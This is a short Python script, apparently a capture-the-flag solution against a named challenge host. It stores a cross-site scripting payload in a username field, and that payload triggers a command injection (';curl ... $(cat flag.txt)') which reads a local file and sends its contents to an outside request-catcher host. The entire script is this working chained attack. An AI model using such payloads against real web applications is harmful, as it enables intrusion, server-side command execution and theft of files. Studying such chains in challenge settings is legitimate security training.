import requests


### DELIVER MALICIOUS PAYLOAD ###
payload = "<script>fetch('/api/date?modifier=;curl https://lego.requestcatcher.com/test?$(cat flag.txt)')</script>"
URL = "http://not-a-problem.chal.cyberjousting.com/"

resp = requests.request("POST", URL + "/api/stats", json={"username": payload, "high_score": 0})
uuid = resp.json()['id']

print("api/stats/" + uuid)